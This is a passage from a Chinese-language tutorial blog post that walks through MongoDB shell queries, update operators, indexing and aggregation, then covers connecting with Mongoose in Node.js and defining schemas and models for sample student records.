db.necessities.insertMany([{&quot;_id&quot;:&quot;612e26f5d5f808a806f499e6&quot;,&quot;name&quot;:&quot;dryer&quot;,&quot;origin&quot;:&quot;San Antonio&quot;},{&quot;_id&quot;:&quot;612e27b6d5f808a806f499e8&quot;,&quot;name&quot;:&quot;charger&quot;,&quot;origin&quot;:&quot;San Diego&quot;},{&quot;_id&quot;:&quot;612e2e03d5f808a806f499e9&quot;,&quot;name&quot;:&quot;conditioner&quot;,&quot;origin&quot;:&quot;Seattle&quot;},{&quot;_id&quot;:&quot;612e3737d5f808a806f499ea&quot;,&quot;name&quot;:&quot;waitforremove&quot;,&quot;origin&quot;:&quot;zsxzy&quot;}]);
</code></pre>
<!--kg-card-end: markdown--><figure class="kg-card kg-image-card kg-card-hascaption"><img src="yourdomain.com/content/images/2021/08/insertMany.png" class="kg-image" alt="MongoDB" loading="lazy" width="1296" height="572" srcset="yourdomain.com/content/images/size/w600/2021/08/insertMany.png 600w, yourdomain.com/content/images/size/w1000/2021/08/insertMany.png 1000w, yourdomain.com/content/images/2021/08/insertMany.png 1296w" sizes="(min-width: 720px) 720px"><figcaption>insertMany</figcaption></figure><!--kg-card-begin: markdown--><pre><code class="language-sql"># &#x67E5;&#x8BE2;&#x96C6;&#x5408;&#x6570;&#x636E; &#x2014;&#x2014; $currentDB.currentCollection.find(query, projection) 
# query(&#x53EF;&#x9009;):&#x4F7F;&#x7528;&#x67E5;&#x8BE2;&#x64CD;&#x4F5C;&#x7B26;&#x6307;&#x5B9A;&#x67E5;&#x8BE2;&#x6761;&#x4EF6;;projection(&#x53EF;&#x9009;):&#x4F7F;&#x7528;&#x6295;&#x5F71;&#x64CD;&#x4F5C;&#x7B26;&#x6307;&#x5B9A;&#x8FD4;&#x56DE;&#x7684;&#x952E;
db.necessities.findOne()|find()|find().count(); # &#x67E5;&#x770B;&#x4E00;&#x4E2A;&#x6587;&#x6863;|&#x6700;&#x591A;20&#x4E2A;&#x5339;&#x914D;&#x7684;&#x6587;&#x6863;|&#x67E5;&#x770B;&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x6587;&#x6863;&#x6570;&#x91CF;
# &#x79FB;&#x9664;&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x6570;&#x636E;
db.necessities.deleteOne({&quot;name&quot;:&quot;waitforremove&quot;});
# &#x66F4;&#x65B0;&#x96C6;&#x5408;&#x6570;&#x636E;
# &#x5982;&#x679C;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x672A;&#x8BBE;&#x7F6E; $set &#x5219;&#x4F1A;&#x62A5;&#x9519; TypeError: Update document requires atomic operators
db.necessities.updateOne({&quot;_id&quot;:&quot;612e3737d5f808a806f499ea&quot;,&quot;name&quot;:&quot;waitforremove&quot;,&quot;origin&quot;:&quot;zsxzy&quot;},{$set:{&quot;name&quot;:&quot;toytoytoy&quot;}});
</code></pre>
<p>&#x67E5;&#x8BE2;&#x5C06;&#x4F1A;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x6E38;&#x6807;&#xFF0C;&#x6E38;&#x6807;&#x53EA;&#x4F1A;&#x5728;&#x9700;&#x8981;&#x65F6;&#x624D;&#x5C06;&#x9700;&#x8981;&#x7684;&#x6587;&#x6863;&#x6279;&#x91CF;&#x8FD4;&#x56DE;&#xFF1B;&#x6E38;&#x6807; (cursor) &#x4E0D;&#x662F;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#xFF0C;&#x800C;&#x662F;&#x67E5;&#x8BE2;&#x7684;&#x8FD4;&#x56DE;&#x8D44;&#x6E90;&#x6216;&#x8005;&#x63A5;&#x53E3;&#x3002;</p>
<p>&#x901A;&#x5E38;&#x6587;&#x6863;&#x53EA;&#x4F1A;&#x90E8;&#x5206;&#x66F4;&#x65B0;&#x3002;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x539F;&#x5B50;&#x6027;&#x7684;&#x66F4;&#x65B0;&#x4FEE;&#x6539;&#x5668;&#xFF08;update modifier&#xFF09;&#xFF0C;&#x6307;&#x5B9A;&#x5BF9;&#x6587;&#x6863;&#x4E2D;&#x7684;&#x67D0;&#x4E9B;&#x5B57;&#x6BB5;&#x8FDB;&#x884C;&#x66F4;&#x65B0;&#x3002;&#x66F4;&#x65B0;&#x4FEE;&#x6539;&#x5668;&#x662F;&#x79CD;&#x7279;&#x6B8A;&#x7684;&#x952E;&#xFF0C;&#x7528;&#x6765;&#x6307;&#x5B9A;&#x590D;&#x6742;&#x7684;&#x66F4;&#x65B0;&#x64CD;&#x4F5C;&#xFF0C;&#x6BD4;&#x5982;&#x4FEE;&#x6539;&#x3001;&#x589E;&#x52A0;&#x6216;&#x8005;&#x5220;&#x9664;&#x952E;&#xFF0C;&#x8FD8;&#x53EF;&#x80FD;&#x662F;&#x64CD;&#x4F5C;&#x6570;&#x7EC4;&#x6216;&#x8005;&#x5185;&#x5D4C;&#x6587;&#x6863;&#x3002;</p>
<p>&#x5047;&#x8BBE;&#x8981;&#x5728;&#x4E00;&#x4E2A;&#x96C6;&#x5408;&#x4E2D;&#x653E;&#x7F6E;&#x7F51;&#x7AD9;&#x7684;&#x5206;&#x6790;&#x6570;&#x636E;&#xFF0C;&#x53EA;&#x8981;&#x6709;&#x4EBA;&#x8BBF;&#x95EE;&#x9875;&#x9762;&#xFF0C;&#x5C31;&#x589E;&#x52A0;&#x8BA1;&#x6570;&#x5668;&#x3002;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x66F4;&#x65B0;&#x4FEE;&#x6539;&#x5668;&#x539F;&#x5B50;&#x6027;&#x5730;&#x5B8C;&#x6210;&#x8FD9;&#x4E2A;&#x589E;&#x52A0;&#x3002;&#x6BCF;&#x4E2A; URL &#x53CA;&#x5BF9;&#x5E94;&#x7684;&#x8BBF;&#x95EE;&#x6B21;&#x6570;&#x90FD;&#x4EE5;&#x5982;&#x4E0B;&#x65B9;&#x5F0F;&#x5B58;&#x50A8;&#x5728;&#x6587;&#x6863;&#x4E2D;&#xFF1A;</p>
<pre><code class="language-javascript">{
    &quot;_id&quot; : ObjectId(&quot;4 &#x5B57;&#x8282;&#x7684;&#x65F6;&#x95F4;&#x6233; 5 &#x5B57;&#x8282;&#x7684;&#x968F;&#x673A;&#x503C; 3 &#x5B57;&#x8282;&#x9012;&#x589E;&#x8BA1;&#x6570;&#x5668;&quot;),&#xFFFC;
    &quot;url&quot; : &quot;www.zstheyi.com&quot;,
    &quot;pageviews&quot; : 422
}
</code></pre>
<p>&#x6BCF;&#x6B21;&#x6709;&#x4EBA;&#x8BBF;&#x95EE;&#x9875;&#x9762;&#xFF0C;&#x5C31;&#x901A;&#x8FC7;URL&#x627E;&#x5230;&#x8BE5;&#x9875;&#x9762;&#xFF0C;&#x5E76;&#x7528; $inc &#x4FEE;&#x6539;&#x5668;&#x589E;&#x52A0; pageviews &#x7684;&#x503C;&#x3002;&#x4F7F;&#x7528;&#x4FEE;&#x6539;&#x5668;&#x65F6;&#xFF0C;_id &#x7684;&#x503C;&#x4E0D;&#x80FD;&#x6539;&#x53D8;&#x3002;</p>
<p>$set &#x7528;&#x6765;&#x6307;&#x5B9A;&#x4E00;&#x4E2A;&#x5B57;&#x6BB5;&#x7684;&#x503C;&#x3002;&#x5982;&#x679C;&#x8FD9;&#x4E2A;&#x5B57;&#x6BB5;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x5219;&#x521B;&#x5EFA;&#x5B83;&#x3002;&#x5E38;&#x7528;&#x4E8E;&#x66F4;&#x65B0;&#x6216;&#x8005;&#x589E;&#x52A0;&#x6587;&#x6863;&#x3002;&#x5220;&#x9664;&#x53EF;&#x4EE5;&#x7528; $unset &#x5B8C;&#x5168;&#x5220;&#x9664;&#x952E;&#x3002;&#x5728;&#x6570;&#x7EC4;&#x4FEE;&#x6539;&#x5668;&#x4E2D;&#xFF0C;$push &#x4F1A;&#x5411;&#x5DF2;&#x6709;&#x7684;&#x6570;&#x7EC4;&#x672B;&#x5C3E;&#x52A0;&#x5165;&#x5143;&#x7D20;&#xFF0C;&#x8981;&#x662F;&#x6CA1;&#x6709;&#x5C31;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x6570;&#x7EC4;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x4E0E; $each &#x7EC4;&#x5408;&#x4E00;&#x6B21;&#x6DFB;&#x52A0;&#x591A;&#x4E2A;&#x503C;&#x3002;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x6570;&#x7EC4;&#x5185;&#x5143;&#x7D20;&#x4E0D;&#x91CD;&#x590D;&#xFF0C;$addToSet &#x4E0E; $ne &#x53EF;&#x4EE5;&#x5B9E;&#x73B0;&#x96C6;&#x5408;&#x6570;&#x636E;&#x3002;$pop &#x8FD9;&#x4E2A;&#x4FEE;&#x6539;&#x5668;&#x6839;&#x636E;&#x4F20;&#x5165;&#x7684; key &#x4ECE;&#x6570;&#x7EC4;&#x4EFB;&#x4F55;&#x4E00;&#x7AEF;&#x5220;&#x9664;&#x5143;&#x7D20;&#x3002;$pull &#x4F1A;&#x5C06;&#x6240;&#x6709;&#x5339;&#x914D;&#x7684;&#x6587;&#x6863;&#x5220;&#x9664;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x53EA;&#x5220;&#x9664;&#x4E00;&#x4E2A;&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><pre><code class="language-sql"># &#x6761;&#x4EF6;&#x64CD;&#x4F5C;&#x7B26; &#x2014;&#x2014; $gt (&gt;), $gte (&gt;=), $in (&#x5305;&#x542B;), $lt (&lt;), $lte (&lt;=), $ne (!=), $nin(&#x4E0D;&#x5305;&#x542B;)&#x3001;$and (&amp;&amp;), $nor(&#x4E0D;&#x7B26;&#x5408;), $not(&#x4E0D;&#x5305;&#x542B;), $or (||)
db.necessities.find({&quot;name&quot;:&quot;dryer&quot;,&quot;origin&quot;:&quot;San Diego&quot;}).pretty(); 
db.necessities.find({$or:[{&quot;name&quot;:&quot;dryer&quot;},{&quot;origin&quot;:&quot;San Diego&quot;}]}).pretty(); # OR &#x6761;&#x4EF6;
db.necessities.find({&quot;price&quot;:{$gt:&quot;1&quot;}})|find({&quot;_id&quot;:{$gt:&quot;1&quot;}})

# $type&#x952E;&#x7C7B;&#x578B;&#x64CD;&#x4F5C;&#x7B26;
db.necessities.find({&quot;name&quot;:{$type:&quot;string&quot;}}) # &#x7B5B;&#x9009;&#x51FA;&#x6307;&#x5B9A;&#x7C7B;&#x578B;&#x952E;&#x7684;&#x6570;&#x636E;

# Limit &#x4E0E; Skip &#x65B9;&#x6CD5;
db.necessities.find().limit(2) # &#x663E;&#x793A;&#x4E24;&#x6761;&#x6587;&#x6863;
db.necessities.find().skip(4) # &#x8DF3;&#x8FC7;&#x6307;&#x5B9A;&#x6570;&#x91CF;&#x7684;&#x6570;&#x636E;

# &#x6392;&#x5E8F;&#x64CD;&#x4F5C; &#x2014;&#x2014; db.COLLECTION_NAME.find().sort({KEY:1})
db.necessities.find().sort({&quot;price&quot;:&quot;1&quot;}) # 1&#x4E3A;&#x7531;&#x5C0F;&#x5230;&#x5927;&#xFF0C;-1&#x4E3A;&#x7531;&#x5927;&#x5230;&#x5C0F;

# &#x7D22;&#x5F15;&#x64CD;&#x4F5C;
db.necessities.createIndex({&quot;price&quot;:1}) # &#x521B;&#x5EFA;&#x7D22;&#x5F15;
db.necessities.getIndexes() # &#x67E5;&#x770B;&#x7D22;&#x5F15;
db.necessities.totalIndexSize() # &#x67E5;&#x770B;&#x96C6;&#x5408;&#x7D22;&#x5F15;&#x5927;&#x5C0F;
db.necessities.dropIndexes() # &#x5220;&#x9664;&#x96C6;&#x5408;&#x6240;&#x6709;&#x7D22;&#x5F15;
db.necessities.dropIndex(&quot;price&quot;) # &#x5220;&#x9664;&#x96C6;&#x5408;&#x6307;&#x5B9A;&#x7D22;&#x5F15;

# &#x805A;&#x5408;(aggregate) &#x2014;&#x2014; &#x4E3B;&#x8981;&#x7528;&#x4E8E;&#x5904;&#x7406;&#x6570;&#x636E;(&#x8BF8;&#x5982;&#x7EDF;&#x8BA1;&#x5E73;&#x5747;&#x503C;&#xFF0C;&#x6C42;&#x548C;&#x7B49;),&#x5E76;&#x8FD4;&#x56DE;&#x8BA1;&#x7B97;&#x540E;&#x7684;&#x6570;&#x636E;&#x7ED3;&#x679C;
db.necessities.aggregate([{$group:{_id:&quot;$origin&quot;,total:{$sum:&quot;$price&quot;}}}]) # &#x901A;&#x8FC7;&#x5B57;&#x6BB5; origin &#x5B57;&#x6BB5;&#x5BF9;&#x6570;&#x636E;&#x8FDB;&#x884C;&#x5206;&#x7EC4;&#xFF0C;&#x5E76;&#x8BA1;&#x7B97; price &#x5B57;&#x6BB5;&#x76F8;&#x540C;&#x503C;&#x7684;&#x603B;&#x548C;
</code></pre>
<p>&#x63D2;&#x5165;&#x6587;&#x6863;&#x6570;&#x636E;&#x4E0D;&#x80FD;&#x4F7F;&#x7528; db.$yourcollection.insert() &#x8FDB;&#x884C;&#x64CD;&#x4F5C;&#xFF0C;&#x800C;&#x662F;&#x9700;&#x8981;&#x91C7;&#x53D6; insertOne() &#x6216;&#x8005; insertMany()&#x3002;&#x66F4;&#x65B0;&#x6587;&#x6863;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x4F7F;&#x7528; replaceOne()&#xFF0C;&#x53EA;&#x80FD;&#x66FF;&#x6362;&#x6574;&#x4E2A;&#x6587;&#x6863;&#xFF1B;&#x800C; updateOne() &#x5219;&#x5141;&#x8BB8;&#x66F4;&#x65B0;&#x5B57;&#x6BB5;&#xFF0C;&#x540C;&#x65F6;&#x8FD8;&#x53EF;&#x4EE5;&#x8BBF;&#x95EE; update operators &#x5BF9;&#x6587;&#x6863;&#x8FDB;&#x884C;&#x53EF;&#x9760;&#x66F4;&#x65B0;&#x3002;&#x79FB;&#x9664;&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4E0D;&#x518D;&#x4F7F;&#x7528; remove()&#xFF0C;&#x800C;&#x6539;&#x7528; deleteOne, deleteMany, findOneAndDelete &#x6216; bulkWrite&#x3002;</p>
<ul>
<li>&#x5728; Navicat Premium &#x8FDE;&#x63A5; MongoDB</li>
</ul>
<p>&#x5728; connection &#x9009;&#x62E9;&#x5BF9;&#x5E94;&#x6570;&#x636E;&#x5E93;&#x540E;&#xFF0C;&#x6309;&#x7167;&#x9ED8;&#x8BA4;&#x89C4;&#x5219;&#x8FDE;&#x63A5;&#x5373;&#x53EF;&#xFF0C;&#x8FDE;&#x63A5;&#x7684;&#x9ED8;&#x8BA4;&#x7AEF;&#x53E3;&#x4E3A; 27017&#x3002;&#x5728;&#x5DE5;&#x5177;&#x680F;&#x7684; View &#x9009;&#x62E9; Show Hidden Items &#x53EF;&#x5C55;&#x793A;&#x9690;&#x85CF;&#x521D;&#x59CB;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF1A;admin&#x3001;config&#x3001;local&#x3002;</p>
<!--kg-card-end: markdown--><!--kg-card-begin: markdown--><h2 id="mongoose">Mongoose</h2>
<p>Mongoose &#x662F;&#x4E00;&#x4E2A; NodeJS &#x4E13;&#x95E8;&#x7528;&#x4E8E;&#x64CD;&#x4F5C; mongodb &#x6570;&#x636E;&#x5E93;&#x7684;&#x6A21;&#x5757;&#xFF0C;&#x4E5F;&#x662F;&#x4E00;&#x4E2A;&#x5728;&#x5F02;&#x6B65;&#x73AF;&#x5883;&#x4E2D;&#x5DE5;&#x4F5C;&#xFF0C;&#x652F;&#x6301; promise &#x548C;&#x5F02;&#x6B65;&#x56DE;&#x8C03;&#x7684;&#x5BF9;&#x8C61;&#x6587;&#x6863;&#x6A21;&#x578B;&#x5E93;&#x3002;Mongoose &#x53EF;&#x4EE5;&#x4E3A;&#x6587;&#x6863;&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x6A21;&#x5F0F;&#x7ED3;&#x6784; (Schema|&#x7EA6;&#x675F;)&#xFF0C;&#x5E76;&#x5BF9;&#x6A21;&#x578B;&#x4E2D;&#x7684;&#x5BF9;&#x8C61;/&#x6587;&#x6863;&#x8FDB;&#x884C;&#x9A8C;&#x8BC1;&#xFF0C;&#x6570;&#x636E;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x7C7B;&#x578B;&#x8F6C;&#x6362;&#x4E3A;&#x5BF9;&#x8C61;&#x6A21;&#x578B;&#xFF0C;&#x4EE5;&#x53CA;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E2D;&#x95F4;&#x4EF6;&#x6765;&#x5E94;&#x7528;&#x4E1A;&#x52A1;&#x903B;&#x8F91;&#x6302;&#x94A9;&#xFF0C;&#x6BD4;&#x8F83;&#x539F;&#x751F;&#x7684; MongoDB &#x9A71;&#x52A8;&#x66F4;&#x5BB9;&#x6613;&#xFF08;&#x8FDB;&#x4E00;&#x6B65;&#x5C01;&#x88C5;&#xFF09;&#x3002;</p>
<table>
    <thead style="font-weight:bold">
        <tr>
            <th>mongoose&#x5BF9;&#x8C61;</th>
            <th>&#x4F5C;&#x7528;&#x63CF;&#x8FF0;</th>
        </tr>
    </thead>
    <tbody style="text-align:center">
        <tr>
            <td>Schema</td>
            <td>&#x6A21;&#x5F0F;&#x5BF9;&#x8C61;&#x5B9A;&#x4E49;&#x7EA6;&#x675F;&#x4E86;&#x6570;&#x636E;&#x5E93;&#x6587;&#x6863;&#x7ED3;&#x6784;</td>
        </tr>
        <tr>
            <td>Model</td>
            <td>Model &#x5BF9;&#x8C61;&#x4F5C;&#x4E3A;&#x6240;&#x6709;&#x6587;&#x6863;&#x7684;&#x8868;&#x793A;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x96C6;&#x5408; collection</td>
        </tr>
        <tr>
            <td>Document</td>
            <td>&#x8868;&#x793A;&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x5177;&#x4F53;&#x6587;&#x6863;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x96C6;&#x5408;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x5177;&#x4F53;&#x6587;&#x6863;</td>
        </tr>
    </tbody>
</table>
<pre><code class="language-shell"># &#x4E0B;&#x8F7D; mongoose &#x8FDE;&#x63A5;&#x6570;&#x636E;&#x5E93;
npm init -y
npm i mongoose --save
</code></pre>
<pre><code class="language-javascript">// &#x57FA;&#x672C;&#x8FDE;&#x63A5;
// &#x9879;&#x76EE;&#x5F15;&#x5165;mongoose
var mongoose = require(&apos;mongoose&apos;);
// &#x8FDE;&#x63A5; mongodb &#x2014;&#x2014; &#x9664;&#x975E;&#x9879;&#x76EE;&#x505C;&#x6B62;,&#x670D;&#x52A1;&#x5668;&#x5173;&#x95ED;,&#x5426;&#x5219;&#x8FDE;&#x63A5;&#x4E00;&#x822C;&#x4E0D;&#x4F1A;&#x65AD;&#x5F00;
mongoose.connect(&apos;mongodb://localhost:27017/&#x6570;&#x636E;&#x5E93;&#x540D;&apos;);
// &#x76D1;&#x542C;&#x8FDE;&#x63A5;&#x72B6;&#x6001; &#x2014;&#x2014; mongoose &#x6709;&#x4E00;&#x4E2A;&#x5C5E;&#x6027;&#x53EB;&#x505A; connection,&#x8BE5;&#x5BF9;&#x8C61;&#x8868;&#x793A;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;
var db = mongoose.connection;
db.on(&apos;error&apos;, console.error.bind(console, &apos;connection error:&apos;));
db.once(&apos;open&apos;, function() { // &#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;&#x7684;&#x4E8B;&#x4EF6;
  // you&apos;re connected!
});
db.once(&apos;close&apos;, function() { // &#x6570;&#x636E;&#x5E93;&#x65AD;&#x5F00;&#x7684;&#x4E8B;&#x4EF6;
  // bye!
});
// &#x65AD;&#x5F00;&#x6570;&#x636E;&#x5E93;&#x8FDE;&#x63A5;(&#x4E00;&#x822C;&#x4E0D;&#x9700;&#x8981;)
mongoose.disconnect()
</code></pre>
<pre><code class="language-javascript">// &#x4F7F;&#x7528; Schema
var mongoose = require(&apos;mongoose&apos;);
mongoose.connect(&apos;mongodb://localhost:27017/mongoose_sgg&apos;);
var db = mongoose.connection;
db.on(&apos;error&apos;, console.error.bind(console, &apos;connection error:&apos;));
db.once(&apos;open&apos;, function() {
  console.log(&quot;you&apos;re connected!&quot;);
});
db.once(&apos;close&apos;, function() {
  console.log(&quot;bye!&quot;);
});
// Schema&#x662F;&#x6784;&#x9020;&#x51FD;&#x6570;
var Schema = mongoose.Schema;
var stuSchema = new Schema({ // &#x521B;&#x5EFA;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x7EA6;&#x675F;
    name: String,
    age: Number,
    gender:{
        type: String, // Boolean&#x9650;&#x5236;&#x592A;&#x591A;,&#x5F00;&#x53D1;&#x4E0D;&#x5E38;&#x7528;
        default: &quot;female&quot;
    },
    address: String
})
// &#x901A;&#x8FC7; Schema &#x521B;&#x5EFA; Model &#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684;&#x96C6;&#x5408;
// mongoose.model(modelName, schema);
// &#x548C;&#x6570;&#x636E;&#x5E93;&#x7684;modelName&#x7684;&#x96C6;&#x5408;&#x6620;&#x5C04;,&#x901A;&#x8FC7;stuSchema&#x8FDB;&#x884C;&#x7EA6;&#x675F;
var StuModel = mongoose.model(&quot;student&quot;, stuSchema); // mongoose&#x4F1A;&#x81EA;&#x52A8;&#x5C06;&#x96C6;&#x5408;&#x540D;&#x53D8;&#x4E3A;&#x590D;&#x6570;
// &#x6570;&#x636E;&#x5E93;&#x63D2;&#x5165;&#x6587;&#x6863;
StuModel.create({
    name: &quot;bjj&quot;,
    age: 17,
    address: &quot;whitebonehole&quot;
}, function(err){
    if(!err){
        console.log(&quot;&#x63D2;&#x5165;&#x6210;&#x529F;&quot;);
    }
})
</code></pre>
<pre><code class="language-javascript">var mongoose = require(&apos;mongoose&apos;);
mongoose.connect(&apos;mongodb://localhost:27017/mongoose_sgg&apos;);
var db = mongoose.connection;
db.on(&apos;error&apos;, console.error.bind(console, &apos;connection error:&apos;));
db.once(&apos;open&apos;, function() {
  console.log(&quot;you&apos;re connected!&quot;);
});
db.once(&apos;close&apos;, function() {
  console.log(&quot;bye!&quot;);
});
var Schema = mongoose.Schema;
var stuSchema = new Schema({
    name: String,
    age: Number,
    gender:{
        type: String,
        default: &quot;female&quot;
    },
    address: String
})
var StuModel = mongoose.model(&quot;student&quot;, stuSchema);
// &#x6709;&#x4E86;&#x6587;&#x6863;&#x5BF9;&#x8C61;&#x5C31;&#x53EF;&#x4EE5;&#x5BF9;&#x6587;&#x6863;&#x8FDB;&#x884C;&#x589E;&#x5220;&#x6539;&#x5DEE;
// Model.create(docs,[callback])
// StuModel.create([
//     {
//         name: &quot;zbj&quot;,
//         age: 28,
//         gender: &quot;male&quot;,
//         address: &quot;gaolaozhuang&quot;
//     },
//     {
//         name: &quot;ts&quot;,
//         age: 15,
//         gender: &quot;male&quot;,
//         address: &quot;datang&quot;
//     }
// ], function(err, jellybean, snickers){ // &#x8FD4;&#x56DE;&#x6210;&#x529F;&#x72B6;&#x6001;&#x4EE5;&#x53CA;&#x63D2;&#x5165;&#x7ED3;&#x679C;
//     if(!err){
//         console.log(&quot;&#x63D2;&#x5165;&#x6210;&#x529F;&quot;);
//     }
// })
// projection-&#x6295;&#x5F71;(&#x9700;&#x8981;&#x83B7;&#x53D6;&#x7684;&#x5B57;&#x6BB5;)&#x3001;options-&#x67E5;&#x8BE2;&#x9009;&#x9879;(skip&#x3001;limit)&#x3001;callback-&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x901A;&#x8FC7;&#x56DE;&#x8C03;&#x51FD;&#x6570;&#x8FD4;&#x56DE;
// Model.find(conditions, [projection], [options], [callback]); &#x2014;&#x2014; &#x67E5;&#x8BE2;&#x7B26;&#x5408;&#x6761;&#x4EF6;&#x6587;&#x6863;,&#x603B;&#x4F1A;&#x8FD4;&#x56DE;&#x6570;&#x7EC4;
// Model.findById(conditions, [projection], [options], [callback]);
// Model.findOne(conditions, [projection], [options], [callback]);
StuModel.find({name:&quot;ts&quot;}, {name:1, _id:0, address:1}, function(err,docs){ // &#x663E;&#x793A;name&#x4E0D;&#x663E;&#x793A;_id =&gt; &#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5199;&#x5B57;&#x7B26;&#x4E32;,&#x4E0D;&#x9700;&#x8981;&#x7684;&#x524D;&#x9762;&#x52A0;&#x4E0A;-
    if(!err){
        console.log(docs); // &#x8FD4;&#x56DE;&#x7684;&#x662F;&#x6570;&#x7EC4; [ { name: &apos;ts&apos;, address: &apos;datang&apos; } ]
        console.log(docs[0].name); // ts
    }
})
StuModel.find({}, &quot;name -_id&quot;, {skip:1}, function(err,docs){ // &#x663E;&#x793A;name&#x4E0D;&#x663E;&#x793A;_id =&gt; &#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5199;&#x5B57;&#x7B26;&#x4E32;,&#x4E0D;&#x9700;&#x8981;&#x7684;&#x524D;&#x9762;&#x52A0;&#x4E0A;-
    if(!err){
        console.log(docs); // [ { name: &apos;bjj&apos; }, { name: &apos;zbj&apos; }, { name: &apos;ts&apos; } ]
    }
})
StuModel.findById(&quot;613397ae66319ccd3dbb0c05&quot;, function(err,doc){ // &#x663E;&#x793A;name&#x4E0D;&#x663E;&#x793A;_id =&gt; &#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5199;&#x5B57;&#x7B26;&#x4E32;,&#x4E0D;&#x9700;&#x8981;&#x7684;&#x524D;&#x9762;&#x52A0;&#x4E0A;-
    if(!err){
        console.log(doc); // &#x6307;&#x5B9A;_id&#x7684;&#x5BF9;&#x8C61;
    }
})
StuModel.findOne({}, &quot;name -_id&quot;, {skip:1}, function(err,doc){ // &#x663E;&#x793A;name&#x4E0D;&#x663E;&#x793A;_id =&gt; &#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5199;&#x5B57;&#x7B26;&#x4E32;,&#x4E0D;&#x9700;&#x8981;&#x7684;&#x524D;&#x9762;&#x52A0;&#x4E0A;-
    if(!err){
        console.log(doc); // { name: &apos;bjj&apos; }
        // Document&#x5BF9;&#x8C61;&#x662F;Model&#x7684;&#x5B9E;&#x4F8B;
        console.log(doc instanceof StuModel) // true
    }
})
// doc&#x4E3A;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x5BF9;&#x8C61;
// Model.update(conditions, doc, [options], [callback]);
// Model.updateMany(conditions, doc, [options], [callback]);
// Model.updateOne(conditions, doc, [options], [callback]);
// &#x4FEE;&#x6539;ts&#x5E74;&#x9F84;&#x4E3A;20
StuModel.updateOne({name: &apos;ts&apos;}, {$set:{age:20}}, function(err){
    if(!err) {
        console.log(&quot;&#x4FEE;&#x6539;&#x6210;&#x529F;&quot;);
    }
})
// Model.remove(conditions, [callback]); &#x4E00;&#x4E2A;&#x5DF2;&#x5F03;&#x7528;&#x7684;&#x51FD;&#x6570;,&#x5DF2;&#x88AB; deleteOne() &#x5220;&#x9664;&#x5355;&#x4E2A;&#x6587;&#x6863;&#x548C; deleteMany() &#x5220;&#x9664;&#x591A;&#x4E2A;&#x6587;&#x6863;&#x53D6;&#x4EE3;
// Model.deleteOne(conditions, [callback]); &#x7528;&#x4E8E;&#x5220;&#x9664;&#x5355;&#x4E2A;&#x6587;&#x6863;
// Model.deleteMany(conditions, [callback]); &#x5728;&#x5220;&#x9664;&#x540E;&#x8FD4;&#x56DE;&#x5DF2;&#x5220;&#x9664;&#x7684;&#x6587;&#x6863;&#x4EE5;&#x9632;&#x5728;&#x5220;&#x9664;&#x64CD;&#x4F5C;&#x540E;&#x9700;&#x8981;&#x5176;&#x5185;&#x5BB9;
StuModel.remove({name: &apos;zbj&apos;},function(err){
    if(!err) {
        console.log(&quot;&#x5220;&#x9664;&#x6210;&#x529F;&quot;);
    }
})
// Module.count(condition, [callback])
StuModel.count({}, function(err, count){
    if(!err){
        console.log(count); // &#x6548;&#x679C;&#x6BD4;find&#x5F97;&#x51FA;&#x6570;&#x7EC4;&#x540E;length&#x597D;,&#x4E0D;&#x5FC5;&#x67E5;&#x627E;&#x6BCF;&#x4E2A;&#x6587;&#x6863;
    }
})
</code></pre>
<pre><code class="language-javascript">var mongoose = require(&apos;mongoose&apos;);
mongoose.connect(&apos;mongodb://localhost:27017/mongoose_sgg&apos;);
var db = mongoose.connection;
db.on(&apos;error&apos;, console.error.bind(console, &apos;connection error:&apos;));
db.once(&apos;open&apos;, function() {
  console.log(&quot;you&apos;re connected!&quot;);
});
db.once(&apos;close&apos;, function() {
  console.log(&quot;bye!&quot;);
});
var Schema = mongoose.Schema;
var stuSchema = new Schema({
    name: String,
    age: Number,
    gender:{
        type: String,
        default: &quot;female&quot;
    },
    address: String
})
var StuModel = mongoose.model(&quot;student&quot;, stuSchema);
// Document&#x548C;&#x96C6;&#x5408;&#x4E2D;&#x6587;&#x6863;&#x4E00;&#x4E00;&#x5BF9;&#x5E94;,Document&#x662F;Model&#x5B9E;&#x4F8B;
// &#x901A;&#x8FC7;Model&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x90FD;&#x662F;Document
// &#x521B;&#x5EFA;&#x4E00;&#x4E2A;document
// var stu = new StuModel({
//     name:&quot;zxxz&quot;,
//     age:19,
//     gender: &quot;female&quot;,
//     address: &quot;tiangong&quot;
// });
// stu.save(function(err){
//     if(!err){
//         console.log(&quot;&#x4FDD;&#x5B58;&#x6210;&#x529F;&quot;); // Saves this document.
//     }
